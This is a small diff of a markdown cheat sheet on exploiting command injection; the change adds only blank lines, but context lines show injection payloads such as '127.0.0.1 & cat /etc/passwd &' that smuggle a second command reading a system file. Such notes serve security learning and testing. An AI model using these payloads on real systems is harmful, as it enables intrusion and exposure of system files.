@@ -72,6 +72,7 @@ Consists of an attacker executing commands on the host operating system via a vu
 
 ### How to exploit command injection ?
 <hr/>
+
 #### Exploiting In-band Command injection
 - Shell metacharacters:
 ```
@@ -90,6 +91,7 @@ $()
 127.0.0.1 & cat /etc/passwd &
 127.0.0.1 || cat /etc/passwd &
 ```
+
 #### Exploiting Blind Command Injection
 - Shell metacharacters: 
 ```
